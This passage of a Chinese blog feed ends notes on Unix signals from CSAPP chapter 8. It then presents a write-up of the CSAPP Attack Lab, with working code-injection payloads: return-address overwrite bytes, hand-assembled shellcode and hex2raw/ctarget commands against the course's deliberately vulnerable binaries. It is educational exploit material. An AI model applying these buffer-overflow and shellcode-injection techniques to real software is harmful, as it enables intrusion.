src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909145242.png"></p><p>在键盘上输入Ctrl+c会导致内核发送一个SIGINT信号到前台进程组的每个进程。默认情况下是终止前台作业。Ctrl+z会发送一个信号到前台进程组的每个进程，默认情况下是停止（挂起）前台作业。</p><p><strong>3.使用kill函数发送信号</strong></p><p>进程通过调用kill函数发送信号给其他进程（包括他们自己）。<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909151028.png"></p><p>如果pid<strong>大于零</strong>，则kill函数发送信号sig给进程pid。如果pid<strong>等于零</strong>，kill函数发送信号给调用进程所在的进程组中的每个进程。如果pid<strong>小于零</strong>kill函数发送信号给进程组|pid|（pid的绝对值）中的每个进程。</p><p><strong>4.用alarm函数发送信号</strong></p><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230909152543.png"></p><h4 id="接收信号"><a href="#接收信号" class="headerlink" title="接收信号"></a>接收信号</h4><p>当内核把进程从内核模式切换到用户模式时（从系统调用中返回或是完成了一次上下文切换），他会检查进程p的未被阻塞的<strong>待处理信号</strong>集合。如果这个集合为空那么内核将控制传递到p的逻辑控制流的下一条指令。如果集合非空，那么内核通常会选择从最小的信号k开始处理，强制进程p接收信号k。收到这个信号会触发进程采取某种行为，一旦完成，控制传递回逻辑控制流的下一条指令</p><p>每个信号类型都有一个预定义的默认行为：</p><ul><li>进程终止</li><li>进程终止并转储内存</li><li>进程停止直到被sigcont信号重启</li><li>进程忽略该信号</li><li>进程可以通过signal函数修改和信号相关联的默认行为<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910024724.png"></li></ul><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910024630.png"></p><p>配上这个程序解释一下<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910024740.png"></p><p>开始运行的时候，调用了signal函数对信号SIGINT即中断信号（Ctrl+c）进行了自定义，也就是当接收到该信号时，会运行指定的程序sigint_handler，pause函数执行后，进程被挂起，此时我们按下Ctrl+c，得到的不是直接终止程序而是”Caught SIGINT”字符串然后再exit（0）。</p><h4 id="阻塞和解除阻塞信号"><a href="#阻塞和解除阻塞信号" class="headerlink" title="阻塞和解除阻塞信号"></a>阻塞和解除阻塞信号</h4><p>Linux提供阻塞信号的<strong>隐式</strong>和<strong>显式</strong>机制：</p><ul><li>隐式阻塞机制。内核默认阻塞任何当前处理程序正在处理信号类型的待处理的信号。说简单一点就是，如果当前进程就收到s信号并正在进行处理，此时就算再发出s信号进程也不予理会，此时的第二个s信号会被放到待处理信号集合中，当出现第三个信号s时，第三个信号s将直接被丢弃。</li><li>显示阻塞机制。通过<strong>sigprocmask</strong>函数和它的辅助函数明确的阻塞和解除阻塞选定的信号。</li></ul><p><img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910032207.png"></p><p>首先来看sigprocmask函数的三个参数，第一个<strong>how</strong>，规定函数如何改变当前阻塞信号集合。第二个参数set是信号集合。第三个参数oldset如果不为NULL的话，则保存之前的阻塞信号集合。</p><p>how的值：<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910032859.png"></p><p>辅助函数：<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910033038.png"></p><p>来个例子<img src="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/QQ%E6%88%AA%E5%9B%BE20230910033131.png"></p><p>首先用了两个辅助函数，Sigemptyset函数将mask初始化为空集合，Sigaddset函数将信号SIGINT加入集合mask中。接下来的Sigprocmask函数使用BLOCK选项，指定将集合mask中的信号添加至阻塞集合，并将之前的阻塞集合保存到prev_mask之中。经过这么一设置我们的Ctrl+c将不再被处理。最后使用setmask方法将保存的prev_mask设置为阻塞列表，起到还原的作用。</p><p>未完待续。。。。。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;控制流&lt;/strong&gt; 简单来讲就是程序执行期间代码执行的顺序和方式，即程序从一个语句到另一个语句的跳转和执行顺序。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CSAPP" scheme="http://example.com/tags/CSAPP/"/>
    
    <category term="ECF" scheme="http://example.com/tags/ECF/"/>
    
  </entry>
  
  <entry>
    <title>Attack_lab</title>
    <link href="http://example.com/2023/08/26/Attack-lab/"/>
    <id>http://example.com/2023/08/26/Attack-lab/</id>
    <published>2023-08-26T05:46:26.000Z</published>
    <updated>2023-08-26T05:56:02.601Z</updated>
    
    <content type="html"><![CDATA[<p>这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。</p><p>​                                                        !  ^_^ !</p><span id="more"></span><p><strong>文件信息：</strong></p><p>argetk中的文件包括:<br>README.txt：描述目录内容的文件<br>ctarget：易受代码注入攻击的可执行程序<br>rtarget：易受面向返回编程攻击的可执行程序<br>cookie.txt：8位十六进制代码，您将在攻击中使用它作为唯一标识符。<br>farm.c：目标“gadget farm”的源代码，您将使用它生成面向返回的编程攻击。<br>hex2raw：生成攻击字符串的实用程序。</p><p><a href="https://blog.csdn.net/weixin_43362650/article/details/121084611">《深入理解计算机系统》实验三Attack Lab下载和官方文档机翻_Addyz的博客-CSDN博客</a></p><p>看官方文档说是要以csapp3.10.3–3.10.4作为参考，这两个小节主要讲了<strong>缓冲区溢出</strong>和保护机制。</p><h3 id="缓冲区溢出："><a href="#缓冲区溢出：" class="headerlink" title="缓冲区溢出："></a>缓冲区溢出：</h3><h3 id="对抗缓冲区溢出攻击："><a href="#对抗缓冲区溢出攻击：" class="headerlink" title="对抗缓冲区溢出攻击："></a>对抗缓冲区溢出攻击：</h3><h4 id="栈随机化："><a href="#栈随机化：" class="headerlink" title="栈随机化："></a>栈随机化：</h4><p>栈的位置每次运行都有变化，因此很多地址不能确定，代码不能实现跳转。实现的方法是在程序开始时，在栈上分配一段0~n字节之间随机大小的空间。</p><h4 id="金丝雀值-canary"><a href="#金丝雀值-canary" class="headerlink" title="金丝雀值(canary):"></a>金丝雀值(canary):</h4><p>在栈的缓冲区开始的位置填充一个值，每次函数调用这个数值要和数据段中的一个不可更改的值进行比较，一旦发生缓冲区溢出，cannary值就会发生变化，从而结束程序。</p><h4 id="限制可执行代码区域："><a href="#限制可执行代码区域：" class="headerlink" title="限制可执行代码区域："></a>限制可执行代码区域：</h4><p>栈空间被设置为不可执行属性，所以不能直接在输入的字符中创建shellcode，要通过rop才能实行攻击。</p><h3 id="实验部分1代码注入攻击："><a href="#实验部分1代码注入攻击：" class="headerlink" title="实验部分1代码注入攻击："></a>实验部分1代码注入攻击：</h3><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1:"></a>Level1:</h4><p>test 调用完getbuf，使getbuf 返回执行touch1 而不是返回test 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!:You called touch1()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   ret    </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40196c:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401971:e8 32 fe ff ff       call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:89 c2                mov    %eax,%edx</span><br><span class="line">  401978:be 88 31 40 00       mov    $0x403188,%esi</span><br><span class="line">  40197d:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  401982:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401987:e8 64 f4 ff ff       call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  401990:c3                   ret    </span><br><span class="line">  401991:90                   nop</span><br><span class="line">  </span><br><span class="line">  00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017c4:c7 05 0e 2d 20 00 01 movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:00 00 00 </span><br><span class="line">  4017ce:bf c5 30 40 00       mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:e8 e8 f4 ff ff       call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  4017dd:e8 ab 04 00 00       call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  4017e7:e8 54 f6 ff ff       call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们只要确定存放返回地址的位置，将其覆盖成4017c0即可。可以看到调用getbuf之后，sub    $0x28,%rsp，创建了0x28字节的缓冲区域，返回地址位于栈底，第一个字符距离栈底28个字节，我们只要输入一串长度为32字节的字符，前二十八个任意填充，后四个按照小端序填充touch1的地址c0 17 40 00即可。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824122941.png"></p><p>正确的姿势是将16进制数据写入flag1.txt然后使用题目中给出的16进制转字符串工具&gt;flag01.txt,然后将flag01.txt作为参数传入。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; flag1.txt  &gt; input1.txt</span><br></pre></td></tr></table></figure><p>注意这里的&lt; 和 &gt;不是括号，而是指向，将flag1.txt传入hex，其输出结果写入input1.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ctarget -q -i flag01.txt</span><br></pre></td></tr></table></figure><ul><li>-q选项是不连接网络 （不加此选项会报错）</li><li>-i 是 以文件作为输入</li></ul><h4 id="Level2："><a href="#Level2：" class="headerlink" title="Level2："></a>Level2：</h4><p>test调用getbuf，并返回touch2，和level1的不同在于touch2需要参数，函数的第一个参数是存放在rdi寄存器中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val==cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touche2(0x%.8x)&quot;</span>,val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>,val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   ret    </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40196c:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401971:e8 32 fe ff ff       call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:89 c2                mov    %eax,%edx</span><br><span class="line">  401978:be 88 31 40 00       mov    $0x403188,%esi</span><br><span class="line">  40197d:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  401982:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401987:e8 64 f4 ff ff       call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  401990:c3                   ret    </span><br><span class="line">  401991:90                   nop</span><br><span class="line">  </span><br><span class="line">  00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017f0:89 fa                mov    %edi,%edx</span><br><span class="line">  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt; vlevel=2;</span><br><span class="line">  4017f9:00 00 00 </span><br><span class="line">  4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;   if(val==cookie)</span><br><span class="line">  401802:75 20                jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:be e8 30 40 00       mov    $0x4030e8,%esi</span><br><span class="line">  401809:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40180e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401813:e8 d8 f5 ff ff       call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40181d:e8 6b 04 00 00       call   401c8d &lt;validate&gt;</span><br><span class="line">  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:be 10 31 40 00       mov    $0x403110,%esi</span><br><span class="line">  401829:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40182e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401833:e8 b8 f5 ff ff       call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40183d:e8 0d 05 00 00       call   401d4f &lt;fail&gt;</span><br><span class="line">  401842:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  401847:e8 f4 f5 ff ff       call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先还是在保存返回地址的地方填充touch2的地址，接下来的难点在于如何将cookie填充到rdi中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp    0x202ce2(%rip),%edi    # if(val==cookie)</span><br></pre></td></tr></table></figure><p>cookie的值储存在相对rip偏移0x202ce2的位置。<strong>思路：</strong> 仍然填充44个字节，最后四个字节填充我们编写的shellcode的地址，通过执行shellcode，rdi填充了cookie，并将touch2的地址pop进了栈，最后ret回到touch2。ret指令相当于pop ip，我们64位机器使用retq。</p><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824222556.png"></p><p>使用gdb进行调试，<code>b getbuf</code> 将断点设在getbuf函数，查看栈的地址，减去0x28之后，栈顶的地址是0x5561dc78。这是我们填充的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov 0x59b997fa,%edi</span><br><span class="line">push touch2_address</span><br><span class="line">retq</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">return_address</span><br></pre></td></tr></table></figure><p>有一点要注意，栈是从高地址向低地址增长，而代码是从低地址往高地址执行所以填充之后栈空间应该是这样<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824231507.png">接下来是得到相应的字节码，首先用gcc进行汇编操作得到.o后缀的目标文件，然后用odjdump进行反汇编即可。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824232603.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:bf fa 97 b9 59       mov    $0x59b997fa,%edi</span><br><span class="line">5:68 ec 17 40 00       push   $0x4017ec</span><br><span class="line">c:c3                   ret    </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure><p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824234910.png"></p><p>成功，中间犯了一个小错误，将<code>push $0x4017ec</code>写成了<code>push   0x4017ec</code>,其中前者代表的是立即数，后者则代表的内存地址处的值。</p><h4 id="Level3："><a href="#Level3：" class="headerlink" title="Level3："></a>Level3：</h4><p>还是test调用完getbuf之后不返回test，而是执行touch3，touch3需要接收参数cookie，touch3中还调用了hexmatch函数，要传递两个参数。</p><p><strong>思路：</strong> 不能直接ret到touch3中，应该像上一个挑战一样，先跳转到我们的shellcode，shellcode完成参数的传递以及ret到touch3。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val,<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="type">char</span>* s=cbuf+random()%<span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s,<span class="string">&quot;%.8x&quot;</span>,val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval,s,<span class="number">9</span>)==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span>* sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(hexmatch(cookie,sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        calidate(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 